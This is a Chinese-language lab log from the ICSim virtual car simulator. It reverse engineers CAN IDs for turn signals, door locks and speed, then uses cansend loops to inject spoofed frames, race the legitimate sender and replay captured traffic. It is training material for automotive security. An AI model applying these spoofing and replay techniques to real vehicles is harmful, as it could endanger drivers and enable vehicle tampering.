# ICSim 车联网安全靶场学习记录

> 记录日期：2026-07-15  
> 学习目标：通过 ICSim 进行 CAN 总线黑盒分析、报文注入、竞争与重放训练，并形成可复用的车联网安全知识库。

---

## 1. 靶场定位

ICSim 本质上是一个基于 SocketCAN 的虚拟汽车仪表盘和控制端，不是完整的漏洞靶场。

```text
controls：合法控制端，模拟车辆控制 ECU
vcan0：虚拟 CAN 总线
icsim：仪表盘接收端
测试者：监听、分析、构造和注入 CAN 报文
```

ICSim 适合训练：

- CAN 报文监听与过滤
- CAN ID 定位
- 信号字节和 bit 位逆向
- 连续数值信号分析
- 报文伪造与状态欺骗
- 多发送源报文竞争
- 流量录制与重放
- 随机化环境下的黑盒重新定位

ICSim 不能直接模拟：

- 实车动力学以及发动机、电机、制动真实控制
- 安全网关、UDS 诊断状态机和 ECU 鉴权
- TBOX、车机、车云、OTA
- 真实 CAN 物理层仲裁、错误帧和总线故障行为

因此，本靶场中“修改车速”主要表示修改仪表盘显示，不等同于让真实车辆物理加速。

---

## 2. 环境与部署过程

### 2.1 环境

```text
主机：Windows
虚拟机：Ubuntu
项目路径：/home/myubuntu/ICSim
CAN 接口：vcan0
```

### 2.2 安装依赖

```bash
sudo apt update

sudo apt install -y \
  git \
  build-essential \
  meson \
  ninja-build \
  pkg-config \
  libsdl2-dev \
  libsdl2-image-dev \
  can-utils
```

验证：

```bash
meson --version
candump -h
```

### 2.3 下载源码时遇到的问题

首次克隆出现：

```text
GnuTLS recv error (-54): Error in the pull function
```

源码没有成功下载，之后又在 `/root` 下执行 Meson，出现：

```text
Neither directory contains a build file meson.build
```

根因不是 Meson，而是：

1. Git 仓库克隆失败；
2. 当前目录不在 ICSim 源码根目录；
3. root 用户的 `~` 是 `/root`，不是 `/home/myubuntu`。

修复后确认源码目录：

```bash
cd /home/myubuntu/ICSim
ls
```

必须存在：

```text
meson.build
```

### 2.4 编译

```bash
cd /home/myubuntu/ICSim
rm -rf builddir
meson setup builddir
meson compile -C builddir
```

编译结果：

```text
builddir/controls
builddir/icsim
```

验证：

```bash
ls -lh builddir/icsim builddir/controls
```

### 2.5 创建虚拟 CAN 接口

```bash
sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan 2>/dev/null || true
sudo ip link set dev vcan0 up
```

检查：

```bash
ip -details link show vcan0
```

### 2.6 启动靶场

仪表盘：

```bash
cd /home/myubuntu/ICSim
./builddir/icsim vcan0
```

控制端，无背景流量：

```bash
cd /home/myubuntu/ICSim
./builddir/controls -X vcan0
```

原始流量监听：

```bash
candump -c vcan0
```

变化字段观察：

```bash
cansniffer -c vcan0
```

---

## 3. CAN 报文基础理解

示例：

```text
vcan0  17C  [8]  00 00 00 00 10 00 00 30
```

字段解释：

```text
vcan0：CAN 接口
17C：CAN ID，十六进制 0x17C
[8]：DLC，数据长度为 8 字节
后续字节：CAN 数据载荷
```

分析原则：

1. 一次只改变一个车辆状态；
2. 观察与动作同步变化的 CAN ID；
3. 定位变化字节；
4. 判断整字节、bit 位或多字节连续值；
5. 使用主动注入验证猜测；
6. 不依赖源码和现成答案。

---

# 4. 转向灯信号逆向

## 4.1 实验方法

```bash
cansniffer -c vcan0
```

只反复执行左转或右转操作。

## 4.2 观察结果

当前环境中：

```text
CAN ID：0x188
DLC：4
报文格式：188#XXXXXXXX
状态字段：Byte 0
```

| Byte 0 | 二进制 | 含义 |
|---:|---|---|
| `00` | `00000000` | 左右灯关闭 |
| `01` | `00000001` | 左灯亮 |
| `02` | `00000010` | 右灯亮 |
| `03` | `00000011` | 左右灯同时亮 |

左转时序：

```text
01 ↔ 00
```

右转时序：

```text
02 ↔ 00
```

转向灯约每 0.5 秒切换一次状态。

## 4.3 组合按键现象

先按左，再按右：

```text
01 ↔ 03
```

表示左灯保持亮，右灯闪烁。

先按右，再按左：

```text
02 ↔ 03
```

表示右灯保持亮，左灯闪烁。

### 结论

ICSim 的组合方向键并不等同于真实车辆标准双闪。若沿用当前 bit 编码，标准双闪效果可能表现为：

```text
03 ↔ 00
```

但真实车辆中的 CAN 编码由厂商和车型决定，不能默认 `01=左转、02=右转、03=双闪`。

## 4.4 主动注入

关闭 `controls` 后：

```bash
# 左灯亮
cansend vcan0 188#01000000

# 右灯亮
cansend vcan0 188#02000000

# 左右同时亮
cansend vcan0 188#03000000

# 全部关闭
cansend vcan0 188#00000000
```

模拟双闪：

```bash
while true; do
    cansend vcan0 188#03000000
    sleep 0.5
    cansend vcan0 188#00000000
    sleep 0.5
done
```

---

# 5. 车门状态位图逆向

## 5.1 操作方式

- 左 Shift + A/B/X/Y：置位，对应车门锁定；
- 右 Shift + A/B/X/Y：清位，对应车门解锁。

## 5.2 观察结果

当前环境中：

```text
CAN ID：0x19B
DLC：6
报文格式：19B#0000XX000000
状态字段：Byte 2，即第 3 个数据字节
```

置位过程：

```text
左 Shift + A：00 00 01 00 00 00
左 Shift + B：00 00 03 00 00 00
左 Shift + Y：00 00 0B 00 00 00
左 Shift + X：00 00 0F 00 00 00
```

清位过程：

```text
右 Shift + A：00 00 0E 00 00 00
右 Shift + B：00 00 0C 00 00 00
右 Shift + Y：00 00 04 00 00 00
右 Shift + X：00 00 00 00 00 00
```

## 5.3 最终位图

| 按键 | 物理车门 | Bit | 掩码 |
|---|---|---:|---:|
| A | 左前门 | bit 0 | `0x01` |
| B | 右前门／副驾驶门 | bit 1 | `0x02` |
| X | 左后门 | bit 2 | `0x04` |
| Y | 右后门 | bit 3 | `0x08` |

```text
Byte 2 = bit3 bit2 bit1 bit0
           Y    X    B    A
         右后 左后 右前 左前
```

| Byte 2 | 含义 |
|---:|---|
| `00` | 四门全部解锁 |
| `01` | 仅左前门锁定 |
| `02` | 仅右前门锁定 |
| `04` | 仅左后门锁定 |
| `08` | 仅右后门锁定 |
| `03` | 两个前门锁定 |
| `0C` | 两个后门锁定 |
| `05` | 左侧前后门锁定 |
| `0A` | 右侧前后门锁定 |
| `0F` | 四门全部锁定 |

逻辑：

```text
锁定：door_state = door_state OR mask
解锁：door_state = door_state AND NOT mask
```

## 5.4 主动注入

```bash
# 四门全部锁定
cansend vcan0 19B#00000F000000

# 四门全部解锁
cansend vcan0 19B#000000000000

# 左侧两门锁定
cansend vcan0 19B#000005000000

# 右侧两门锁定
cansend vcan0 19B#00000A000000
```

---

# 6. 车速连续信号逆向

## 6.1 默认模式观察结果

```text
CAN ID：0x244
DLC：5
报文格式：244#000000XXXX
车速字段：Byte 3、Byte 4
字节序：大端
```

解析：

```text
raw = (Byte3 << 8) | Byte4
```

现象：

- 按住上方向键：最后两个字节总体递增；
- 仪表盘指针向右移动；
- 到达上限后数值停止增长；
- 松开上键：最后两个字节持续递减；
- 归零后进入 `01 xx` 空闲模式；
- `xx` 每帧随机变化；
- `0x244` 仍持续高频发送，并没有真正消失。

静止流量示例：

```text
244#0000000131
244#00000001DE
244#000000017C
244#00000001E0
```

`01 xx` 是 ICSim 的空闲随机数据，不应将每一帧都解释成真实车速。

## 6.2 固定值主动注入

关闭 `controls` 后：

```bash
cansend vcan0 244#0000001388
cansend vcan0 244#0000002710
```

观察结果：

- `1388`：仪表停在约 30～40 mph；
- `2710`：仪表停在约 60 mph；
- 只发送单帧后，指针保持，不自动回退。

这说明 ICSim 仪表盘缺少：

- 来源认证；
- 新鲜度校验；
- 报文超时后自动失效；
- 与其他传感器的合理性验证。

## 6.3 报文竞争

`controls` 与注入端同时发送 `0x244`：

```bash
while true; do
    cansend vcan0 244#0000002710
    sleep 0.05
done
```

现象：

- 指针短暂跳到约 60 mph；
- 随后被 `controls` 的正常报文覆盖；
- 仪表在正常速度和伪造速度之间摆动；
- 提高注入频率后，摆动频率增加；
- 不会改变 `controls` 内部维护的模拟速度。

原因：

```text
controls：维护自己的 current_speed，并持续发送 0x244
注入端：独立发送固定 0x244
icsim：每收到一帧就覆盖显示值
```

因此验证的是：

```text
仪表显示欺骗 + 同一 CAN ID 的多发送源竞争
```

不能证明真实车辆会物理加速。

---

# 7. 遗留高频发送进程排查

高频注入后，即使停止 `controls`，总线上仍持续出现：

```text
244#0000002710
```

两秒内统计到 332 帧，说明旧的 Shell 循环仍在其他终端运行。

由于 `cansend` 每次存活时间很短，普通 `pgrep` 可能只看到长期运行的父 `bash`，而看不到瞬时 `cansend`。

排查：

```bash
while true; do
    ps -eo pid,ppid,tty,cmd |
        grep '[c]ansend vcan0 244#0000002710' &&
        break
done
```

停止方法：

- 回到原终端按 `Ctrl+C`；
- 杀死对应父 Shell；
- 找不到时重启虚拟机。

验证总线清空：

```bash
timeout 2s candump -L vcan0,244:7FF > /tmp/final_check.log
wc -l /tmp/final_check.log
```

没有任何发送者时应为：

```text
0 /tmp/final_check.log
```

---

# 8. 流量录制与重放

## 8.1 录制

```bash
candump -L vcan0,188:7FF,19B:7FF > event.log
```

录到的左转序列：

```text
188#01000000
188#00000000
188#01000000
188#00000000
188#01000000
188#00000000
```

车门状态示例：

```text
19B#00000F000000
```

## 8.2 回放

停止 `controls`，保留仪表盘：

```bash
canplayer -I /home/myubuntu/event.log
```

重放实验说明：

- 仪表盘可以响应历史录制报文；
- 仪表盘无法区分合法 `controls` 与 `canplayer`；
- 报文中缺少发送者身份；
- 当前 ICSim 环境不存在滚动计数器、认证标签或新鲜度验证。

```text
合法操作录制
→ 停止合法控制端
→ canplayer 重新发送历史流量
→ 仪表盘复现原有状态
```

---

# 9. 随机化模式训练

## 9.1 启动

随机仪表盘：

```bash
cd /home/myubuntu/ICSim
./builddir/icsim -r vcan0
```

记下 Seed，控制端使用相同 Seed：

```bash
./builddir/controls -s <Seed> -X vcan0
```

## 9.2 随机模式车速重新定位

```text
CAN ID：0x2C3
DLC：7
报文格式：2C3#00000000XXXX00
车速字段：Byte 4、Byte 5
字节序：大端
```

静止状态：

```text
00 00 00 00 01 xx 00
```

固定值：

```text
2C3 [7] 00 00 00 00 13 88 00
```

主动注入：

```bash
cansend vcan0 2C3#00000000138800
```

该实验证明：

- 随机模式改变了 CAN ID；
- 改变了 DLC；
- 改变了字段位置；
- 仍能通过时间相关性和连续变化趋势重新定位车速；
- 掌握的是黑盒分析方法，而不是固定答案。

---

# 10. 核心方法总结

## 10.1 单变量法

一次只改变一个状态：

```text
左转开/关
单个车门锁定/解锁
只按上键加速
```

## 10.2 时间相关性

不能只看某一帧，应观察完整时序：

```text
01 ↔ 00
02 ↔ 00
01 ↔ 03
02 ↔ 03
```

## 10.3 bit 位分析

```text
before XOR after = changed_mask
```

例如：

```text
0x0F XOR 0x0E = 0x01
```

说明 bit 0 发生变化。

## 10.4 多字节连续值分析

重点观察：

- 连续递增与递减；
- 大端或小端；
- 缩放关系；
- 空闲状态异常值；
- 报文周期。

## 10.5 主动验证

```text
观察相关性
→ 提出映射假设
→ 停止 controls
→ cansend 构造报文
→ 检查仪表响应
```

## 10.6 区分显示欺骗和物理控制

```text
修改 0x244
→ 修改仪表显示
≠ 改变车辆动力
```

实车中还需要判断：

- 报文由哪些 ECU 消费；
- 是显示信号还是控制请求；
- 是否存在网关、CRC、Alive Counter；
- 是否存在多传感器合理性校验；
- 是否会触发降级或故障保护。

---

# 11. ICSim 阶段完成情况

```text
[✓] 完成环境部署与编译
[✓] 创建并使用 vcan0
[✓] 使用 candump 监听流量
[✓] 使用 cansniffer 定位变化字段
[✓] 逆向转向灯 CAN ID 与 bit 位
[✓] 分析组合按键的状态机现象
[✓] 逆向四个车门位图
[✓] 建立车门物理位置映射
[✓] 逆向车速多字节字段
[✓] 分析静止状态 01xx 随机数据
[✓] 完成固定车速主动注入
[✓] 完成正常报文与伪造报文竞争实验
[✓] 区分仪表欺骗与真实车辆加速
[✓] 完成流量录制与 canplayer 重放
[✓] 完成随机模式车速重新定位
```

---

# 12. 阶段结论

通过本阶段训练，已经形成以下能力链：

```text
CAN 流量监听
→ CAN ID 定位
→ 字节和 bit 位分析
→ 多字节连续数值解析
→ 报文主动构造
→ 仪表状态欺骗
→ 多发送源报文竞争
→ 历史流量重放
→ 随机映射黑盒重新定位
```

ICSim 阶段继续寻找更多仪表信号的收益已经较低，可以结束。

---

# 13. 下一阶段建议

进入虚拟 ECU 与 UDS 诊断安全：

```text
发现 ECU
→ 识别请求/响应 CAN ID
→ ISO-TP 单帧和多帧
→ UDS 服务枚举
→ 诊断会话切换
→ DID 读取
→ 否定响应 NRC
→ Security Access
→ Seed-Key
→ 诊断刷写流程
```

推荐环境：

```text
uds-server
Caring Caribou
can-utils
Scapy Automotive
UDSCTF
```

建议优先训练：

1. ECU 地址发现；
2. UDS `0x10` 诊断会话；
3. UDS `0x22` 读取 DID；
4. UDS `0x27` Security Access；
5. NRC 否定响应分析；
6. ISO-TP 分段和重组；
7. UDS 服务自动化枚举。

---

# 14. 知识库建议目录

```text
Vehicle-Security-KB/
├── Labs/
│   └── ICSim/
│       ├── ICSim学习记录.md
│       ├── captures/
│       │   ├── event.log
│       │   ├── speed.log
│       │   └── random-speed.log
│       └── screenshots/
├── CAN/
│   ├── CAN帧结构.md
│   ├── CAN-ID定位方法.md
│   ├── bit位信号逆向.md
│   ├── 连续信号逆向.md
│   ├── 报文重放.md
│   └── 报文竞争与状态欺骗.md
└── Scripts/
    ├── can_inject.py
    ├── can_diff.py
    └── can_period_stats.py
```
